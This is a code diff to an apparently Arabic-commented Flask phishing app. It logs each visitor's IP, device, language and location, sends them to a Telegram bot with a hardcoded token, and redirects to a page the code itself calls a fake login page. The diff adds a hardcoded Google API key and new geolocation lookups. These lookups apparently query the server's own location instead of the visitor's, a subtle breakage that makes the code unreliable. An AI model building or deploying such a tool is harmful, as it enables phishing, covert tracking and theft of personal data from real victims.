@@ -10,6 +10,9 @@ TELEGRAM_BOT_TOKEN = "8155493968:AAG4EgYUasUC27VxMs1IPIEthR4jt1tYsmE"
 TELEGRAM_CHAT_ID = "7810572372"
 TIKTOK_REDIRECT_URL = "https://vt.tiktok.com/ZSVk69HTA/"
 
+# ========== إعدادات Google API ==========
+GOOGLE_API_KEY = "AIzaSyCo8F4N1VfyxrtIbpTbpiMlARkhKhks3cY"
+
 # ========== دالة الإرسال إلى تليجرام ==========
 def send_to_telegram(message):
     """إرسال رسالة نصية إلى بوت التليجرام"""
@@ -25,6 +28,41 @@ def send_to_telegram(message):
     except Exception as e:
         print(f"خطأ في الإرسال لتليجرام: {e}")
         return False
+
+# ========== دوال جمع الموقع ==========
+def get_location_via_google():
+    """جلب الموقع الدقيق باستخدام Google Geolocation API"""
+    url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
+    try:
+        response = requests.post(url, json={}, timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            if 'location' in data:
+                lat = data['location']['lat']
+                lng = data['location']['lng']
+                accuracy = data.get('accuracy', 'غير معروف')
+                return {'lat': lat, 'lng': lng, 'accuracy': accuracy}
+    except Exception as e:
+        print(f"خطأ في Google Geolocation: {e}")
+    return None
+
+def get_location_via_ip():
+    """جلب الموقع التقريبي عبر IP"""
+    try:
+        response = requests.get('http://ip-api.com/json/', timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            if data.get('status') == 'success':
+                return {
+                    'city': data.get('city', 'غير معروف'),
+                    'country': data.get('country', 'غير معروف'),
+                    'lat': data.get('lat', 'غير متاح'),
+                    'lon': data.get('lon', 'غير متاح'),
+                    'isp': data.get('isp', 'غير معروف')
+                }
+    except Exception as e:
+        print(f"خطأ في IP Geolocation: {e}")
+    return None
 
 # ========== الصفحة الرئيسية (وجهة الضحية) ==========
 @app.route('/')
@@ -45,26 +83,52 @@ def index():
     elif "Mac" in user_agent:
         os_info = "🍎 Mac"
     
-    # جلب الموقع التقريبي
-    try:
-        ip_response = requests.get(f'http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp')
-        ip_data = ip_response.json()
-        if ip_data['status'] == 'success':
-            location = f"{ip_data.get('city', 'غير معروف')}, {ip_data.get('country', 'غير معروف')}"
-            isp = ip_data.get('isp', 'غير معروف')
-            lat = ip_data.get('lat', 'غير متاح')
-            lon = ip_data.get('lon', 'غير متاح')
+    # محاولة جلب الموقع عبر Google Geolocation (الأكثر دقة)
+    google_location = get_location_via_google()
+    if google_location:
+        lat = google_location['lat']
+        lon = google_location['lng']
+        accuracy = google_location['accuracy']
+        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+        gps_msg = f"""
+<b>📍 موقع دقيق (Google Geolocation)</b>
+<b>🗺️ خط العرض:</b> {lat}
+<b>🗺️ خط الطول:</b> {lon}
+<b>📏 الدقة:</b> {accuracy} متر
+<b>📍 <a href='{maps_link}'>على الخريطة</a></b>
+"""
+        send_to_telegram(gps_msg)
+        location = f"Google GPS: {lat}, {lon}"
+        isp = "Google Geolocation"
+    else:
+        # 2. في حال فشل Google، استخدام IP
+        ip_location = get_location_via_ip()
+        if ip_location:
+            location = f"{ip_location['city']}, {ip_location['country']}"
+            lat = ip_location['lat']
+            lon = ip_location['lon']
+            isp = ip_location['isp']
+            maps_link = f"https://www.google.com/maps?q={lat},{lon}"
+            ip_msg = f"""
+<b>📍 موقع تقريبي (IP)</b>
+<b>🌍 المدينة:</b> {location}
+<b>🗺️ الإحداثيات:</b> {lat}, {lon}
+<b>📍 <a href='{maps_link}'>على الخريطة</a></b>
+<b>📡 مزود الخدمة:</b> {isp}
+"""
+            send_to_telegram(ip_msg)
         else:
-            location, isp, lat, lon = "غير متاح", "غير متاح", "غير متاح", "غير متاح"
-    except:
-        location, isp, lat, lon = "خطأ في الجلب", "خطأ في الجلب", "خطأ", "خطأ"
+            location = "غير متاح"
+            lat = "غير متاح"
+            lon = "غير متاح"
+            isp = "غير متاح"
     
     # تسجيل البيانات التقنية في الملف
     log_entry = f"""
     ═══════════════════════════════════════════
     [زيارة جديدة] - {datetime.datetime.now()}
     🌐 IP: {client_ip}
-    📍 الموقع التقريبي: {location}
+    📍 الموقع: {location}
     📡 مزود الخدمة: {isp}
     📱 نظام التشغيل: {os_info}
     🌍 اللغة: {accept_lang}
@@ -74,16 +138,11 @@ def index():
     with open('log.txt', 'a', encoding='utf-8') as f:
         f.write(log_entry)
     
-    # ====== إنشاء رابط خرائط جوجل ======
-    maps_link = f"https://www.google.com/maps?q={lat},{lon}" if lat != 'غير متاح' and lat != 'خطأ' else "غير متاح"
-    
-    # إرسال البيانات التقنية إلى تليجرام مع رابط الخريطة
+    # إرسال البيانات التقنية إلى تليجرام
     tech_msg = f"""
 <b>🆕 زيارة جديدة!</b>
 <b>🌐 IP:</b> {client_ip}
-<b>📍 الموقع التقريبي:</b> {location}
-<b>🗺️ الإحداثيات:</b> {lat}, {lon}
-<b>📍 <a href="{maps_link}">على الخريطة</a></b>
+<b>📍 الموقع:</b> {location}
 <b>📡 مزود الخدمة:</b> {isp}
 <b>📱 نظام التشغيل:</b> {os_info}
 <b>🌍 اللغة:</b> {accept_lang}
@@ -91,10 +150,10 @@ def index():
 """
     send_to_telegram(tech_msg)
     
-    # 2. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
+    # 3. إعادة التوجيه إلى صفحة تسجيل الدخول الوهمية
     return redirect('/login')
 
-# ========== صفحة تسجيل الدخول الوهمية (مع رابط Cloudflare Tunnel الجديد) ==========
+# ========== صفحة تسجيل الدخول الوهمية ==========
 login_page_html = '''
 <!DOCTYPE html>
 <html>
@@ -479,7 +538,6 @@ def gps_data():
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
         f.write(f"\n═══════════════════════════════════════════\n📍 موقع دقيق - {datetime.datetime.now()}\n🗺️ خط العرض: {lat}\n🗺️ خط الطول: {lon}\n📏 الدقة: {accuracy} متر\n🌐 IP: {request.remote_addr}\n═══════════════════════════════════════════\n")
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-    # التصحيح هنا: استخدام علامات تنصيص مفردة حول maps_link
     gps_msg = f"<b>📍 موقع دقيق (GPS)</b>\n<b>🗺️ خط العرض:</b> {lat}\n<b>🗺️ خط الطول:</b> {lon}\n<b>📏 الدقة:</b> {accuracy} متر\n<b>📍 <a href='{maps_link}'>على الخريطة</a></b>"
     send_to_telegram(gps_msg)
     return {"status": "success"}, 200
